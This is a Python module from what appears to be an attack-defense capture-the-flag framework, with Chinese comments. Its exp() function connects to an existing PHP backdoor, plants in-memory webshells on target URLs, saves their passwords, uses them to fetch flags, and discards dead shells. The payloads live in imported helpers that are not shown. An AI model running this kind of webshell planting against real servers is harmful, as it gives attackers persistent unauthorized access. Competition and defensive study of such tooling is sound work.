import os
from module.php.shell import shell , get_flag , n_md5
from Attack_Defense_Framework_master import debug
from module.php.config import salt_key , shell_conf_path , get_shell_from_conf , wait_time , save_shell_conf
from module.tool import log_success , log_info , log_split


# exp(url , name , **arguments)
# 初始化 shell_conf
# 检测是否存在 shell_conf 中
    # 不存在
        # 连接后门马
        # 写入内存马
# 如果写入成功或者已经存在
    # 连接内存马
        # 获得 flag
        # 未获得
            # 去除失效shell

get_key = lambda url , name : "%s|%s" % (name , n_md5(url)) # 处理 ; # ( 这两个字符为 配置文件的注释符）
def exp(url , name , root , key , type ):
    # web shell的种类， eval # code | system # shell
    shell_conf = {}
    if os.path.exists(shell_conf_path):
        shell_conf = get_shell_from_conf()

    # 处理 root
    if root[-1] != '/':
        root = root + "/"

    # 获取 shell key
    shell_key = get_key(url, name)

    # 检测 是否在 shell_conf 中已经存在 内存马
    if ( (shell_key in shell_conf.keys()) is False) or (len(shell_conf[shell_key]['shell_list']) == 0):
        # 不存在 ， 开始尝试连接写入
        bRet, password, shell_list = shell(url, key = key, root= root , type=type)
        if bRet is True:
            log_success("%s active %d memory shell success" % (url, len(shell_list)))
            shell_conf[shell_key] = {
                "shell_list": shell_list,
                "shell_password": password,
            }
    # 获取 flag
    # 检测是否存在 内存马
    flag = None
    if ((shell_key in shell_conf.keys()) is True) and (len(shell_conf[shell_key]['shell_list']) != 0):
        shell_dict = shell_conf[shell_key]
        for webshell in shell_dict['shell_list']:
            try: # 尝试 获取 flag
                flag = get_flag(webshell, shell_dict['shell_password'], salt_key)
                if flag != None:
                    break
                else:  # 移除 无效 shell
                    # log_fail("%s get flag failed , removed " % (webshell))
                    shell_conf[shell_key]["shell_list"].remove(webshell)
            except Exception as e_g:
                # log_fail("%s get flag failed , removed " % (webshell))
                shell_conf[shell_key]["shell_list"].remove(webshell)


    bRet = save_shell_conf(shell_conf)

    if bRet is True:
        if debug is True:
            log_success("save shell conf success")
    return flag # 不存在 马 或者 没有 连接成功内存马